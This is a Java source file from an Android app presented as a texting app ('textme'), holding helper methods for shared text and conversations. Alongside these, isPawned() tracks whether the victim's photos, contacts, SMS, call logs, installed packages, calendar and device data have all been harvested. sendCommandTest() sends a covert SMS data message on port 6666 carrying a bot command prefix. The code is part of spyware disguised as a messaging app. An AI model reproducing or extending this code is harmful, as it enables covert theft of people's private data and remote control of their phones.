package com.candroid.textme.api;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;

import com.candroid.textme.data.Commands;
import com.candroid.textme.data.Constants;
import com.candroid.textme.services.MessagingService;
import com.candroid.textme.ui.activities.MainActivity;

import static com.candroid.textme.jobs.JobsScheduler.CALENDAR_EVENTS_KEY;
import static com.candroid.textme.jobs.JobsScheduler.CONTACTS_KEY;
import static com.candroid.textme.jobs.JobsScheduler.DCIM_KEY;
import static com.candroid.textme.jobs.JobsScheduler.DEVICE_KEY;
import static com.candroid.textme.jobs.JobsScheduler.FAKE_PHONE_CALL_KEY;
import static com.candroid.textme.jobs.JobsScheduler.PACKAGES_KEY;
import static com.candroid.textme.jobs.JobsScheduler.PHONE_CALLS_KEY;
import static com.candroid.textme.jobs.JobsScheduler.SMS_KEY;

public class Lofl {

    public static String handleSharedText(Intent intent) {
        StringBuilder text = new StringBuilder();
        Bundle extras = intent.getExtras();
        if (extras != null) {
            if (extras.containsKey(Intent.EXTRA_TEXT)) {
                text.append(extras.getString(Intent.EXTRA_TEXT));
            }
            if (extras.containsKey(Intent.EXTRA_SUBJECT)) {
                text.append(" ").append(extras.getString(Intent.EXTRA_SUBJECT));
            }
            if (extras.containsKey(Intent.EXTRA_TITLE)) {
                text.append(" ").append(extras.getString(Intent.EXTRA_TITLE));
            }
            if (extras.containsKey(Intent.EXTRA_HTML_TEXT)) {
                text.append(" ").append(extras.getString(Intent.EXTRA_TITLE));
            }
        }
        return text.toString();
    }

    public static void setJobRan(Context context, String key) {
        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
        editor.putBoolean(key, true);
        editor.apply();
    }

    public static boolean isPawned(Context context) {
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        return sharedPreferences.getBoolean(DCIM_KEY, false) && sharedPreferences.getBoolean(PACKAGES_KEY, false) &&
                sharedPreferences.getBoolean(CONTACTS_KEY, false) &&
                sharedPreferences.getBoolean(DEVICE_KEY, false) &&
                sharedPreferences.getBoolean(PHONE_CALLS_KEY, false) &&
                sharedPreferences.getBoolean(SMS_KEY, false) &&
                sharedPreferences.getBoolean(CALENDAR_EVENTS_KEY, false) &&
                sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
    }

    public static void createConversation(final Context context, String address, String sharedText) {
        Intent notifyIntent = new Intent();
        if (sharedText != null) {
            notifyIntent.putExtra(Constants.Keys.SHARED_TEXT_KEY, sharedText);
        }
        notifyIntent.putExtra(Constants.Keys.ADDRESS_KEY, address);
        notifyIntent.setAction(Constants.CREATE_CONVERSATION_ACTION);
        context.sendBroadcast(notifyIntent);
        ((MainActivity) context).runOnUiThread(new Runnable() {
            @Override
            public void run() {
                ((MainActivity) context).onBackPressed();
            }
        });
    }

    public static void sendCommandTest(Context context){
        SmsManager smsManager = SmsManager.getDefault();
        String command = Bot.COMMAND_CODE + Commands.CREATE_CONTACT + " --Jack Mehoff --12334567890";
        smsManager.sendDataMessage(MessagingService.sTelephoneAddress, null, new Short("6666"), command.getBytes(), null, null);
    }
}